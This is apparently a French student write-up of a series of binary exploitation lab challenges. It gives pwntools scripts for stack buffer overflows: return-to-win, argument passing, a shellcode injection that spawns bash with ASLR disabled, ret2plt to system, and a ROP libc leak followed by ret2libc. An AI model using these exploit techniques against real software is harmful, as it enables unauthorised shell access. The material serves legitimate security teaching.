
#### Chall 2

```python
#!/bin/python3

from pwn import *
io = process('./chall_2')
payload = b"A"*0x100
payload += b"ZzzzZzzz"
print(payload)
io.sendlineafter(b"?", payload)
io.interactive()
io.close()
```

#### Chall 3

```python
#!/bin/python3

from pwn import *

g = cyclic_gen()
a = g.get(100)

io = process('./chall_3')
payload = (b"A"*0x100)
payload += b"ZzzzZzzz"
#payload += a   # ajout du cyclique
payload += (b"A"*12)
# grace au cyclique ça crache et en regardant les logs noyau (dmesg | tail)
# on sait que ça s'arrete à aaaabaaacaaa (6161616...) donc 12
payload += p32(0x080491a6)  # on met adresse de la fonction win que l'on trouve dans radare2
io.sendlineafter(b"?", payload)
io.interactive()
io.close()
```

#### Chall 4

```python
#!/bin/python3

from pwn import *

winaddr = 0x080491b6
arg1 = 0x1020304
arg2 = 0x5060708

io = process('./chall_4')
payload = (b"A"*0x100)
payload += b"ZzzzZzzz"
payload += (b"A"*12)
payload += p32(winaddr)  # on met adresse de la fonction win que l'on trouve dans radare2
payload += (b"PADD") # car "sub esp, 4"
payload += p32(arg1)
payload += p32(arg2)

io.sendlineafter(b"?", payload)
io.interactive()
io.close()
```
Dans ce challenge il faut bien ajouter un padding de 4 (PADD) pour accéder à l'adresse mémoire des key que nous avons trouvé sur IDA après le sEIP que nous avons modifié chall 3 pour accéder a la fonction Win

#### Chall 5

- Désactiver ASLR :
```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

- Premier code python
```python
#!/bin/python3

from pwn import *

shellcode = b"\x31\xdb\x31\xc9\x53\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xda\x89\xe3\x51\x89\xe1\x31\xc0\xb0\x0b\xcd\x80"
fact = 0x100 - len(shellcode)  # Ox100 = ancien padding
# fact permet de compléter le shellcode pour remplir le buffer
eax_deb_buffer = 0

io = process('./chall_5')
payload = shellcode
payload += (b"A"*fact)
payload += b"ZzzzZzzz"
payload += (b"A"*12)
gdb.attach(io) # on lance un GDB
input()  # On met un input pour intérompre le code
payload += p32(eax_deb_buffer) # on met l'adresse du début du buffer (pour l'instant on ne la connait pas)

io.sendlineafter(b"?", payload)
io.interactive()
io.close()
```
Le shellcode a été fournit par le prof. 
Lorsque l'on lance le code, un gdb se lance :
```
gef➤  disas vuln
   0x08049234 <+142>:   call   0x8049050 <fgets@plt>
   0x08049239 <+147>:   add    esp,0x10
gef➤  b *0x0804923   (on break juste après le fgets)
gef➤  info registers
gef➤  c         
```
disas vuln pour récupérer l'adresse du fgets et faire un breakpoint dessus avec la commande `b*0xffffce18` pour ensuite continuer l'input sur python et utiliser la commande continue et récuperer la valeurs de eax avec la commande info register.
- Appuyer sur "entrée" dans le terminal où est lancé le script pour continuer
```
gef➤  info registers
eax            0xffffcff8          0xffffcff8
```
Le début du buffer est à l'adresse de `eax`.

- On peut maintenant ajouter l'adresse dans le script :
```python
#!/bin/python3

from pwn import *

shellcode = b"\x31\xdb\x31\xc9\x53\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xda\x89\xe3\x51\x89\xe1\x31\xc0\xb0\x0b\xcd\x80"
fact = 0x100 - len(shellcode)
eax_deb_buffer = 0xffffcff8

io = process('./chall_5')
payload = shellcode
payload += (b"A"*fact)
payload += b"ZzzzZzzz"

payload += (b"A"*12)
#gdb.attach(io)
#input()
payload += p32(eax_deb_buffer) # pointe sur l'adresse du début du buffer donc du shellcode

io.sendlineafter(b"?", payload)
io.interactive()
io.close()
```

#### Chall 6

Dans ce chall le but est de taper sur la fonction système qui est présent dans la plt qui va ensuite appeler la table GOT.

- Activer ASLR :
```bash
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
```

Observer dans Radare2
```bash
r2 chall_6
```

CLI
```
[0x080490a0]> iS
12  0x00001020   0x80 0x08049020   0x80 -r-x PROGBITS    .plt

[0x080490a0]> pd 20 @0x08049020

╎   ;-- system:
╎   0x08049070      ff2510c00408   jmp dword [reloc.system]    ; 0x804c010 ; "v\x90\x04\b\x86\x90\x04\b\x96\x90\x04\b"
╎   0x08049076      6820000000     push 0x20                   ; 32
└─< 0x0804907b      e9a0ffffff     jmp section..plt

[0x080490a0]> iz

0   0x00003024 0x0804c024 9   10   .data   ascii /bin/bash
```
Pour récupérer l'adresse de la plt nous utilisons la commande iS ou iS~ .plt et ensuite nous utilisons la commande pd pour print dissassembly 20 pour 20 inscruction à partir de l'emplacement ou nous somme et "@" pour préciser l'emplacement de la plt.
suite à cette commande nous obtenons l'adresse de jump de la lib systeme : '0x08049070'
Dans notre payload nous envoyons l'adresse de la lib système puis 4 de padding pour ensuite envoyer l'argument qui est un bin bash déja inclut dans le programme.

GUI
```
Window > Info > Sections 
	Voir en bas à droite adresse de .plt
		clique droit > show in > disassembly
			recup adresse de [reloc_system]

sym.vuln > strings > recup adresse de /bin/bash
```

- Script Python
```python
#!/bin/python3

from pwn import *

plt_sys = 0x08049070       # addresse plt [reloc.system]
addr_string = 0x0804c024   # addresse de la string "/bin/bash"

io = process('./chall_6')
payload = (b"A"*0x100)
payload += b"ZzzzZzzz"
payload += (b"A"*12)
payload += p32(plt_sys)
payload += (b"A"*4)  # il faut mettre un padding de 4 avant d'appeler une fonction
payload += p32(addr_string)
io.sendlineafter(b"?", payload)
io.interactive()
io.close()
```
Une fois le buffer remplis et débordé comme dans les chall d'avant, on appelle la fonction "system", on se décale de 4 et on insère un argument, ici "/bin/bash" (en insérant l'adresse qui pointe sur la string "/bin/bash" )

#### Chall 7

Regarde dans le HEADER ELF mis en argument pour sortir les libs appelés.
```
ldd fichier_binaire
```
Permet de vérifier la ou les libs. La sorti de cette commande doit être mise dans le ELF(...).

- Afficher les sections présente dans un binaire :
```bash
readelf -S fichier_binaire 
```
Ici on peut voir que les sections .init, .plt, .text et .fini ont le flag eXecutable, c'est donc ici que nous allons trouver nos gadgets.

- Afficher les fonctions importées de la libc et leur adresse dans la GOT :
```bash
objdump -R fichier_binaire
```

- Récup l'adresse référençant puts dans la plt (ici 0x00001070):
```bash
[$] <> objdump -d chall_7 | grep "<puts@plt>" 
00001070 <puts@plt>:
    1264:	e8 07 fe ff ff       	call   1070 <puts@plt>
    12af:	e8 bc fd ff ff       	call   1070 <puts@plt>
    12c3:	e8 a8 fd ff ff       	call   1070 <puts@plt>
```

- RopGadget permet d'extraire les gadgets d'un binaire :
```bash
[$] <> ROPgadget --binary chall_7 
0x0000101e : pop ebx ; ret
```
On y trouve un gadget `0x080482f5 : pop ebx ; ret;` idéal pour notre exploitation.

Code finale
```python
#!/bin/python3

from pwn import *

POP_EBX_RET = 0x0000101e
VULN_TO_BASE = 0x000011dd
PUTS_PLT = 0x00001070
PRINTF_GOT = 0x00004004
GOT_PLT = 0x00003ff4

libc = ELF("/lib/i386-linux-gnu/libc.so.6", checksec=False)
io = process("./chall_7")
_vuln = int(io.recvline().split(b" @ ")[1], 16)

_base = _vuln - VULN_TO_BASE
_got_plt = _base + GOT_PLT
_puts_plt = _base + PUTS_PLT
_printf_got = _base + PRINTF_GOT
_pop_ebx_ret = _base + POP_EBX_RET

log.info("Target   BASE : 0x{:08x}".format(_base))
log.info("Target vuln() : 0x{:08x}".format(_vuln))
log.info("got.plt (ebx) : 0x{:08x}".format(_got_plt))
log.info("puts@PLT      : 0x{:08x}".format(_puts_plt))
log.info("printf@GOT    : 0x{:08x}".format(_printf_got))
log.info("pop gadget    : 0x{:08x}".format(_pop_ebx_ret))

payload = b"A"*0x100           # Padding to fill in the buffer
payload += b"ZzzzZzzz"          # Overwrite food.token
payload += p32(_got_plt)        # Rewrite the saved EBX (@got.plt)
payload += p32(0xdeadbeef) * 2  # Padding until we reach sEIP

payload += p32(_puts_plt)           # Overwrite sEIP to call puts and leak the printf() GOT's entry
payload += p32(_pop_ebx_ret)        # POP to clean up the arg and jump to the next stage
payload += p32(_printf_got)         # printf GOT's entry
payload += p32(_vuln)               # Ret2vuln so we can replay the vuln

io.sendlineafter(b"?", payload)

print(io.recvline())
print(io.recvline())
  
leak = io.recvline()
  
print("")
print(leak)
print("")
  
_base_libc = u32(leak[:4]) - libc.symbols["printf"]
_system_libc = _base_libc + libc.symbols["system"]
_binsh_libc = _base_libc + next(libc.search(b"/bin/sh\x00"))
  
log.info("libc          : 0x{:08x}".format(_base_libc))
log.info("system@libc   : 0x{:08x}".format(_system_libc))
log.info("binsh @libc   : 0x{:08x}".format(_binsh_libc))
  
payload = b"A"*0x100           # Padding to fill in the buffer
payload += b"ZzzzZzzz"          # Overwrite food.id
payload += p32(_got_plt)        # Rewrite the saved EBX (@got.plt)
payload += p32(0xdeadbeef) * 2  # Padding until we reach sEIP
  
payload += p32(_system_libc)    # Overwrite sEIP to call puts and leak the printf() GOT's entry
payload += p32(_pop_ebx_ret)    # POP to clean up the arg and jump to the next stage
payload += p32(_binsh_libc)     # printf GOT's entry

io.sendlineafter(b"?", payload)

io.interactive()
io.close()
```